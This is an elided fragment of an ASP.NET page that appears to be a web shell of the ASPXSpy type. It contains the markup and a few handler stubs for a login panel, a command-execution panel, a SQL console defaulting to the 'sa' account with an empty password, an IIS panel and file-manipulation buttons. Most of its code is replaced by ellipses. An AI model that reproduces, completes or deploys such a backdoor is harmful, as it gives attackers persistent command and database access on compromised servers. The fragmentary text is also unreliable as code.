   ...
   protected void Bin_DBPage(object sender, DataGridPageChangedEventArgs e) 
    ...
    protected void Bin_SAexecButton_Click(object sender, EventArgs e)
    {
        try
        {
            ...
            Bin_ResLabel.Text = "<hr><div style=\"width:100%\" id=\"nei\"><PRE>" + res.Replace(" ", "&nbsp;").Replace("<", "&lt;").Replace(">", "&gt;") + "</PRE></div>";
...
<body>
    <form id="form1" runat="server"><div style="text-align: center"><asp:Panel ID="Bin_LoginPanel" runat="server" Height="47px" Width="401px">
            ...
            </asp:Panel><asp:Panel ID="Bin_MenuPanel" runat="server" Height="56px" Width="800px">
        ...
        <asp:Panel ID="Bin_MainPanel" runat="server" Width="769px" EnableViewState="False" Visible="False" Height="20px">
            ...
            <asp:Button ID="Bin_CutButton" runat="server" Text="Cut" Width="46px" OnClick="Bin_CutButton_Click" />
                ...
                <asp:Panel ID="Bin_CmdPanel" runat="server" Height="50px" Width="763px"><hr />
                    ...
                    <hr /></asp:Panel>
        <asp:Panel ID="Bin_SQLPanel" runat="server" Visible="False" Width="900px">
            <hr />
            ConnString :
            <asp:TextBox ID="Bin_SQLconnTextBox" runat="server" Width="700px">server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB</asp:TextBox><br />
            ...
            <asp:Panel ID="Bin_DBmenuPanel" runat="server" Width="900px" Visible="False">
            ...
            <asp:Panel ID="Bin_AccPanel" runat="server" Height="50px" Width="900px" EnableViewState="False">
               <asp:Label ID="Bin_AccinfoLabel" runat="server" Text="Label" EnableViewState="False"></asp:Label><br />
            <asp:TextBox ID="Bin_DBstrTextBox" runat="server" TextMode="MultiLine" style="width:100%;"></asp:TextBox>
        ...
        <asp:Panel ID="Bin_IISPanel" runat="server" Width="900px"><div style="text-align:left">
            <hr />
